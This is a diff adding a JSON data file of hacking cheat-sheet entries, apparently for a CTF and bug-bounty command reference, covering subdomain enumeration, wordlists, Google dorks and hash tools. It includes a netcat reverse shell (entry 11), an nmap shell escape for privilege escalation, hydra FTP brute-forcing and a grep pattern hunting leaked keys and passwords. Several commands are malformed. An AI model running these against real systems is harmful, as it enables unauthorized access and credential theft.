@@ -1,0 +1,321 @@
+[
+  {
+    "id": 1,
+    "title": "connect with ssh",
+    "content": "change file mode <br> <copycode>chmod id_rsa 600</copycode> <br> connect ssh with id_rsa <br><copycode>ssh user@ -i id_rsa</copycode>",
+    "keywords": [
+      "connect",
+      "ssh",
+      "sshkey",
+      "id_rsa",
+      "rce",
+      "reverse shell"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 2,
+    "title": " crt.sh web scraping using grep command.",
+    "content": "<copycode>\ncurl -s https://crt.sh/\\?q\\=%25.example.com\\&output\\=json | jq . | grep 'name_value' | awk '{print $2}' | sed -e 's/\"//g'| sed -e 's/,//g' |  awk '{gsub(/\\\\n/,\"\\n\")}1' | sort -u \n</copycode>",
+    "keywords": [
+      "crt.sh",
+      "filter",
+      "subdomains",
+      "grep",
+      "curl"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 3,
+    "title": "CTFs and labs",
+    "content": "HackThisSite <br>\nHackinghub<br>\nHackingplaning<br>\nportswigger academy<br>\nAlert 1 to win - XSS<br>\nPrompt.ml - XSS<br>\nXSS-game<br>\nVulnhub.com<br>\nW3challs.com<br>\nPicoCTF<br>\nRoot-me.org<br>\nOverthewire<br>\nXSS from pwnfunction<br>\nxss lab<br>",
+    "keywords": [
+      "ctf",
+      "website",
+      "xss",
+      "labs",
+      "hacking",
+      "xss labs"
+    ],
+    "category": "CTF"
+  },
+  {
+    "id": 4,
+    "title": "filter wordlist, sorting wordlist",
+    "content": "for ftp bruteforce<br>\n\n<copycode>grep -E '^.{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>\n<copycode>grep -E '^[[:alnum:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>\n<copycode>grep -E '^[[:alpha:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>\n<copycode>grep -E '^[[:upper:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>\n<copycode>grep -E '^[[:lower:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>\n<copycode>grep -E '^[[:digit:]]{5}$' /usr/share/wordlists/rockyou.txt > 5_cha_rockyou.txt</copycode>",
+    "keywords": [
+      "filter",
+      "sorting",
+      "wordlist",
+      "rockyou",
+      "grep -e"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 5,
+    "title": "Search flag in whole directory",
+    "content": "<copycode>\ngrep -nr \"picoCTF\"\n</copycode>",
+    "keywords": [
+      "find",
+      "flag",
+      "grep",
+      "whole",
+      "directory",
+      "search flag",
+      "ctf"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 6,
+    "title": "hydra FTP brute-force",
+    "content": "<copycode>\nhydra -l username -p password ftp://IPV4/..\n</copycode>\n<br>\n<copycode>\nhydra -L username.txt -P pass.txt ftp://IPV4/...\n</copycode>",
+    "keywords": [
+      "hydra",
+      "ftp",
+      "bruteforce"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 7,
+    "title": "gobuster subdomain gathering(active scan)",
+    "content": "<copycode>\ngobuster dns -d example.com -w word_list.txt\n</copycode>\n<br>\n<copycode>\ngobuster dns -d example.com -w word_list.txt -i\n</copycode>\n<br>\ni - ip address",
+    "keywords": [
+      "gobuster",
+      "subdomain",
+      "enum",
+      "information gathering"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 8,
+    "title": "install .tar file in linux",
+    "content": "<copycode>tar -xvf filename.tar </copycode>",
+    "keywords": [
+      "install",
+      "tar",
+      "linux",
+      "kali linux"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 9,
+    "title": "find all JS files",
+    "content": "<copycode>\nkatana -u sub.domain.com\n</copycode><br>\n<copycode>\nkatana -u domain.com > website_all_js_files.txt\n</copycode>\n<br>\nfind secret info\n<br>\n<copycode>\ncat website_all_js_files.txt | while read url; do python3 SecretFinder.py -i $url -o cli; done\n</copycode>",
+    "keywords": [
+      "katana",
+      "find js",
+      "disclosure",
+      "secret finder"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 10,
+    "title": "Convert md5 hashing",
+    "content": "<copycode>\nfor word in $(cat wordlist.txt); do echo -n \"$word\" | md5sum | awk '{print $1}' >> md5.txt; done\n</copycode>",
+    "keywords": [
+      "md5",
+      "hashing",
+      "convert"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 11,
+    "title": "Netcat remote access",
+    "content": "victim site<br>\n<copycode>\nnc host port -e /bin/bash\n</copycode>\n<br>\nour site\n<copycode>\nnc -lvnp port_number\n</copycode>",
+    "keywords": [
+      "netcat",
+      "remote",
+      "access",
+      "/bin/bash",
+      "reverse shell"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 12,
+    "title": "nmap privilege escalation",
+    "content": "<copycode>\nnmap --interactive <br>\nnmap>!sh\n</copycode>\n",
+    "keywords": [
+      "nmap",
+      "privilege",
+      "escalation"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 13,
+    "title": "private bug bounty program",
+    "content": "<copycode>\ninurl:/bugbounty insite:lk\n</copycode>",
+    "keywords": [
+      "private",
+      "bugbounty",
+      "program",
+      "bbp",
+      "dorks"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 14,
+    "title": "privilege escalation find SUID files",
+    "content": "<copycode>\nfind / -perm -u=s -type f 2>/dev/null\n</copycode><br>\n<copycode>\nfind / -perm -g=s -type f 2>/dev/null\n</copycode><br>\n<copycode>\nfind / -perm -g=s -o -perm -u=s -type f 2>/dev/null\n</copycode><br>\n<copycode>\nfind /home -writable -type d 2>/dev/null\n</copycode><br>\n<copycode>\nfind . -type f -perm 0777 -print\n</copycode>",
+    "keywords": [
+      "privilege escalation",
+      "find",
+      "suid",
+      "super user",
+      "gtfobin"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 15,
+    "title": "Python HTTP server",
+    "content": "start python http server<br>\n<copycode>\npython -m http.server port_num\n</copycode>",
+    "keywords": [
+      "python",
+      "http",
+      "server"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 16,
+    "title": "python setup.py install and requirements.txt ",
+    "content": "<copycode>\npython setup.py install<br>\npython3 setup.py install\n</copycode><br>\n<copycode>\npython setup.py install<br>\npython3 setup.py install\n</copycode>",
+    "keywords": [
+      "requirements.txt",
+      "install",
+      "setup.py",
+      "python"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 17,
+    "title": "subfinder subdomain gather",
+    "content": "<copycode>\nsubfinder -d example.com\n</copycode>",
+    "keywords": [
+      "subfinder"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 18,
+    "title": "subbrute",
+    "content": "<copycode>\npython3 subbrute.py -p example.com -c 16 \n</copycode>\n<br>\n-p : optional (DNS records)<br>\n-c : threads (max 16)\n\n",
+    "keywords": [
+      "subbrute"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 19,
+    "title": "assetfinder",
+    "content": "<copycode>\nassetfinder --subs-only example.com\n</copycode>",
+    "keywords": [
+      "assetfinder"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 20,
+    "title": "upgrading pty with python",
+    "content": "<copycode>\npython -c 'import pty;pty.spawn('/bin/bash')'\n</copycode>",
+    "keywords": [
+      "upgrading",
+      "tty",
+      "pty",
+      "putty"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 21,
+    "title": "finding subdomain takeover vuln",
+    "content": "<copycode>subfinder -d example.com -v -o output_subdomains.txt</copycode><br>\n<copycode>subzy run --targets example_subdomains.txt --hide_fails</copycode>\n<br>\n\n--tragets => is taget subdomain wordlist<br>\n--hide_fails => show only vulnerable domains",
+    "keywords": [
+      "subzy",
+      "subdomain",
+      "takeover",
+      "subfinder"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 22,
+    "title": "Search flag in whole directory",
+    "content": "<copycode>\ngrep -nr \"picoCTF\"<br>\ngrep -nr \"flag\"<br>\ngrep -nr \"THM\"  //its search text or words in whole directoty<br>\n</copycode>\n<br>\nsearching file name in current directory",
+    "keywords": [
+      "Search",
+      "flag",
+      "whole",
+      "directory",
+      "ctf",
+      "grep"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 23,
+    "title": "google Dork private bugbounty program",
+    "content": "  <copycode>\n  inurl: /bugbounty insite:lk<br>\n  site:.lk \"bug bounty program\"<br>\n  site:.lk \"bug bounty program\" OR \"security vulnerability reward\"<br>\n  site:.lk \"security disclosure\" OR \"vulnerability disclosure\"<br>\n  site:.lk \"vulnerability disclosure policy\"<br>\n  site:.lk \"report vulnerability\" OR \"security researcher\" OR \"responsible disclosure\"<br>\n  site:.lk \"report vulnerability\" OR \"security researcher reward\"<br>\n  site:.lk inurl:bugbounty OR inurl:security<br>\n  site:.lk inurl:bugbounty OR inurl:disclosure<br>\n  site:.lk \"cybersecurity initiative\" OR \"bug bounty\" OR \"disclosure program\"<br>\n  site:.lk \"cybersecurity initiative\" OR \"security disclosure\" OR \"bug bounty\"<br>\n  inurl /bug bounty<br>\n  inurl : / security<br>\n  inurl:security.txt<br>\n  inurl:security \"reward\"<br>\n  inurl : /responsible disclosure<br>\n  inurl : /responsible-disclosure/ reward<br>\n  inurl : / responsible-disclosure/ swag<br>\n  inurl : / responsible-disclosure/ bounty<br>\n  inurl:'/responsible disclosure' hoodie<br>\n  responsible disclosure swag r=h:com<br>\n  responsible disclosure hall of fame<br>\n  inurl:responsible disclosure $50<br>\n  responsible disclosure europe<br>\n  responsible disclosure white hat<br>\n  white hat program<br>\n  insite:\"responsible disclosure\" -inurl:nl<br>\n  intext responsible disclosure<br>\n  site eu responsible disclosure<br>\n  site .nl responsible disclosure<br>\n  site responsible disclosure<br>\n  responsible disclosure:sites<br>\n  responsible disclosure r=h:nl<br>\n  responsible disclosure r=h:uk<br>\n  responsible disclosure r=h:eu<br>\n  responsible disclosure bounty r=h:nl<br>\n  responsible disclosure bounty r=h:uk<br>\n  responsible disclosure bounty r=h:eu<br>\n  responsible disclosure swag r=h:nl<br>\n  responsible disclosure swag r=h:uk<br>\n  responsible disclosure swag r=h:eu<br>\n  responsible disclosure reward r=h:nl<br>\n  responsible disclosure reward r=h:uk<br>\n  responsible disclosure reward r=h:eu<br>\n  \"powered by bugcrowd\" -site:bugcrowd.com<br>\n  \"submit vulnerability report\"<br>\n  \"submit vulnerability report\" | \"powered by bugcrowd\" | \"powered by hackerone\"<br>\n  site:*.gov.* \"responsible disclosure\"<br>\n  intext:\"we take security very seriously\"<br>\n  site:responsibledisclosure.com<br>\n  inurl:'vulnerability-disclosure-policy' reward<br>\n  intext:Vulnerability Disclosure site:nl<br>\n  intext:Vulnerability Disclosure site:eu<br>\n  site:*.*.nl intext:security report reward<br>\n  site:*.*.nl intext:responsible disclosure reward<br>\n  \"security vulnerability\" \"report\"<br>\n  inurl\"security report\"<br>\n  \"responsible disclosure\" university<br>\n  inurl:/responsible-disclosure/ university<br>\n  buy bitcoins \"bug bounty\"<br>\n  inurl:/security ext:txt \"contact\"<br>\n  \"powered by synack\"<br>\n  intext:responsible disclosure bounty<br>\n  inurl: private bugbountyprogram<br>\n  inurl:/.well-known/security ext:txt<br>\n  inurl:/.well-known/security ext:txt intext:hackerone<br>\n  inurl:/.well-known/security ext:txt -hackerone -bugcrowd -synack -openbugbounty<br>\n  inurl:reporting-security-issues<br>\n  inurl:security-policy.txt ext:txt<br>\n  site:*.*.* inurl:bug inurl:bounty<br>\n  site:help.*.* inurl:bounty<br>\n  site:support.*.* intext:security report reward<br>\n  intext:security report monetary inurl:security<br>\n  intext:security report reward inurl:report<br>\n  site:security.*.* inurl: bounty<br>\n  site:*.*.de inurl:bug inurl:bounty<br>\n  site:*.*.uk intext:security report reward<br>\n  site:*.*.cn intext:security report reward<br>\n  \"vulnerability reporting policy\"<br>\n  \"van de melding met een minimum van een\" -site:responsibledisclosure.nl<br>\n  inurl:responsible-disclosure-policy<br>\n  \"If you believe you've found a security vulnerability\"<br>\n  intext:\"BugBounty\" and intext:\"BTC\" and intext:\"reward\"<br>\n  intext:bounty inurl:/security<br>\n  inurl:\"bug bounty\" and intext:\"\u20ac\" and inurl:/security<br>\n  inurl:\"bug bounty\" and intext:\"$\" and inurl:/security<br>\n  inurl:\"bug bounty\" and intext:\"INR\" and inurl:/security<br>\n  inurl:/security.txt \"mailto*\" -github.com  -wikipedia.org -portswigger.net -magento<br>\n  /trust/report-a-vulnerability<br>\n  site:*.edu intext:security report vulnerability<br>\n  \"cms\" bug bounty<br>\n  \"If you find a security issue\"  \"reward\"<br>\n  \"responsible disclosure\" intext:\"you may be eligible for monetary compensation\"<br>\n  inurl: \"responsible disclosure\", \"bug bounty\", \"bugbounty\"<br>\n  intext: we offer a bounty<br>\n  responsible disclosure inurl:in<br>\n  site:*.br responsible disclosure<br>\n  site:*.at responsible disclosure<br>\n  site:*.be responsible disclosure<br>\n  site:*.au responsible disclosure<br>\n  site:*/security.txt \"bounty\"<br>\n  inurl:bug bounty intext:\"rupees\"<br>\n  inurl:bug bounty intext:\"\u20b9\"<br>\n  inurl:responsible disclosure intext:\"INR\"<br>\n</copycode>",
+    "keywords": [
+      "google",
+      "dorks",
+      "private",
+      "bug bounty"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 24,
+    "title": "find sensitive information or bugs in javascript files (katana, neclei)",
+    "content": "<copycode>\n/// getting all the js files<br>\n  cat domains.txt | katana | grep js | httpx -mc 200 | tee js.txt<br>\n  -----------------------------------------------------------------------<br>\n  /// find any bugs in javascript files<br>\n  nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_bugs.txt<br>\n  -----------------------------------------------------------------------<br>\n  /// find sensitive information in JS files<br>\n\n  file=\"js.txt\"<br>\n  # Loop through each line in the file<br>\n  while IFS= read -r link<br>\n  do<br>\n      # Download the JavaScript file using wget<br>\n      wget \"$link\"<br>\n  done < \"$file\"<br>\n  -----------------------------------------------------------------------<br>\n  //grep command for find api,passwords,.....<br>\n\n  grep -r -E \"aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp\" *.js<br>\n\n</copycode>\n",
+    "keywords": [
+      "find",
+      "sensitive",
+      "info",
+      "bug",
+      "in js",
+      "javascript",
+      "nuclei",
+      "exposure",
+      "katana"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 25,
+    "title": "cat all the text file in current directory (it help to find a flag using grap)",
+    "content": "<copycode><br>\n  for file in $(find /path/to/your/directory -type f -name \"*.txt\"); do<br>\n      cat \"$file\"<br>\n  done<br>\n</copycode>",
+    "keywords": [
+      "cat",
+      "all file",
+      "in current directory",
+      "see all the text file",
+      "view al the text file"
+    ],
+    "category": "commands"
+  },
+  {
+    "id": 26,
+    "title": "hash identify (identify hash types)",
+    "content": "<copycode>\ngem install haiti-hash<br>\nhaiti hasing_value\n</copycode>\n<br>\n<copycode>\nsudo apt install hashid<br>\nhashid hash_value\n</coycode>\n<br>\n<copycode>\ngit clone https://github.com/blackploit/hash-identifier.git<br>\ncd hash-identifier<br>\npython hash-identifier.py\n</copycode>",
+    "keywords": [
+      "hashid",
+      "haiti",
+      "identify",
+      "hash types"
+    ],
+    "category": "commands"
+  }
+]
